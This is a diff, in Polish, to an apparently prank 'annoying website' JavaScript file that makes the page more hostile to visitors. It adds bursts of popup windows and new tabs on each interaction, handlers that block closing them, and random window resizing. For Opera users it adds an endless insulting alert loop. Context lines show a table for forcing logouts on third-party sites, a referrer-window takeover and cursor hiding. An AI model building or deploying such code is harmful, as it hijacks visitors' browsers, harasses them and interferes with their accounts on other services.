@@ -2,9 +2,9 @@ const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
 const WIN_HEIGHT = 260
-const VELOCITY = 15
+const VELOCITY = 30
 const MARGIN = 10
-const TICK_LENGTH = 50
+const TICK_LENGTH = 25
 
 var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
 
@@ -60,7 +60,12 @@ const VIDEOS = [
   'media/videos/hardcore.mp4',
   'media/videos/dieta.mp4',
   'media/videos/shreksophone.mp4',
-  'media/videos/gloglogangalab.mp4'
+  'media/videos/gloglogangalab.mp4',
+  'media/videos/zle_swinie.mp4',
+  'media/videos/eleven.mp4',
+  'media/videos/tsunami.mp4',
+  'media/videos/ArabskieCos.mp4',
+  'media/videos/Zbyszek.mp4',
 ]
 
 const FILE_DOWNLOADS = [
@@ -120,13 +125,6 @@ const LOGOUT_SITES = {
   Guilded:  ['POST', 'https://www.guilded.gg/api/logout'] // added by @cryblanka
 }
 
-if(isOpera) {
-  document.write("<h1>Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego! 🤓👆 (Polecam Firefox i jego forki! ew. brave)</h1>")
-  
-    setInterval(() => {
-      console.log("Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego! 🤓👆 (Polecam Firefox i jego forki! ew. brave)")
-    }, 1000)
-}
 
 /**
  * Array to store the child windows spawned by this window.
@@ -182,20 +180,7 @@ else initParentWindow()
  */
 function init () {
   confirmPageUnload()
-  
-  // Dodaj wykrywanie Opery i wyświetlanie komunikatu
 
-  if (isOpera) {
-    setInterval(() => {
-      window.alert("Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego! 🤓👆 (Polecam Firefox i jego forki! ew. brave)");
-    }, 1000);
-  }
-
-  // if (navigator.userAgent.indexOf("OPR") > -1 || navigator.userAgent.indexOf("Opera") > -1) {
-  //   setInterval(() => {
-  //     window.alert("Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego!");
-  //   }, 3000);
-  // }
 
   interceptUserInput(event => {
     interactionCount += 1
@@ -280,6 +265,14 @@ function initParentWindow () {
   interceptUserInput(event => {
     // Only run these on the first interaction
     if (interactionCount === 1) {
+      if(isOpera) {
+
+        setInterval(() => {
+          window.alert("Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego! 🤓👆 (Polecam Firefox i jego forki! ew. brave)");
+          console.log("Twoja przeglądarka ssie pałe! Zmień ją na coś lepszego! 🤓👆 (Polecam Firefox i jego forki! ew. brave)")
+        }, 1000);
+      }
+      
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
       hideCursor()
@@ -592,33 +585,63 @@ function focusWindows () {
  * Open a new popup window. Requires user-initiated event.
  */
 function openWindow () {
-  const { x, y } = getRandomCoords()
-  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
+  // Najpierw otwórz nowe karty
+  openManyTabs()
+  
+  // Następnie kontynuuj z oryginalnymi pop-upami
+  for (let i = 0; i < 8; i++) {
+    const { x, y } = getRandomCoords()
+    const newSize = randomWindowSize()
+    const opts = `width=${newSize.width},height=${newSize.height},left=${x},top=${y}`
+    const win = window.open(window.location.pathname, '', opts)
 
-  // New windows may be blocked by the popup blocker
-  if (!win) return
-  wins.push(win)
+    if (!win) continue
+    wins.push(win)
 
-  if (wins.length === 2) setupSearchWindow(win)
+    if (wins.length === 2) setupSearchWindow(win)
 
-  // Added by @wetraks
-  win.onunload = function () {
-    // Some browsers might not support onunload, but include it for completeness
-    return false;
-  };
+    win.onunload = function () {
+      return false
+    }
 
-  // For modern browsers
-  win.addEventListener("beforeunload", function (e) {
-    e.preventDefault();
-    e.returnValue = "";
-  });
+    win.addEventListener("beforeunload", function (e) {
+      e.preventDefault()
+      e.returnValue = ""
+    })
 
-  // For older browsers
-  win.onbeforeunload = function () {
-    return "";
-  };
-  // Added by @wetraks
+    win.onbeforeunload = function () {
+      return ""
+    }
+  }
+
+  setTimeout(() => {
+    // Otwórz kolejną serię kart
+    openManyTabs()
+    
+    // I kolejne pop-upy
+    for (let i = 0; i < 5; i++) {
+      const { x, y } = getRandomCoords()
+      const newSize = randomWindowSize()
+      const opts = `width=${newSize.width},height=${newSize.height},left=${x},top=${y}`
+      const win = window.open(window.location.pathname, '', opts)
+      
+      if (!win) continue
+      wins.push(win)
+
+      win.onunload = function () {
+        return false
+      }
+
+      win.addEventListener("beforeunload", function (e) {
+        e.preventDefault()
+        e.returnValue = ""
+      })
+
+      win.onbeforeunload = function () {
+        return ""
+      }
+    }
+  }, 500)
 }
 
 /**
@@ -851,6 +874,12 @@ function moveWindowBounce () {
     if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
 
     window.moveBy(vx, vy)
+
+    // Dodajemy losową zmianę rozmiaru
+    if (Math.random() < 0.1) { // 10% szans na zmianę rozmiaru w każdej klatce
+      const newSize = randomWindowSize()
+      window.resizeTo(newSize.width, newSize.height)
+    }
   }, TICK_LENGTH)
 }
 
@@ -863,7 +892,7 @@ function startVideo () {
   video.src = getRandomArrayEntry(VIDEOS)
   video.autoplay = true
   video.loop = true
-  video.style = 'width: 100%; height: 100%;'
+  video.style = 'width: 100%; height: 100%; object-fit: cover;'
 
   document.body.appendChild(video)
 }
@@ -1199,3 +1228,34 @@ document.addEventListener('keydown', function(e) {
       return false;
   }
 });
+
+function openManyTabs() {
+  const urls = [
+    window.location.href,
+    'https://www.google.com/search?q=' + encodeURIComponent(getRandomArrayEntry(SEARCHES)),
+    window.location.href + '?tab=new',
+    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+    window.location.href + '?tab=another'
+  ]
+
+  urls.forEach((url, i) => {
+    setTimeout(() => {
+      const newTab = window.open(url, '_blank')
+      if (newTab) {
+        newTab.focus()
+      }
+    }, i * 100)
+  })
+}
+
+function randomWindowSize() {
+  const minWidth = 200
+  const maxWidth = Math.min(800, SCREEN_WIDTH - 100)
+  const minHeight = 150
+  const maxHeight = Math.min(600, SCREEN_HEIGHT - 100)
+  
+  return {
+    width: Math.floor(Math.random() * (maxWidth - minWidth) + minWidth),
+    height: Math.floor(Math.random() * (maxHeight - minHeight) + minHeight)
+  }
+}
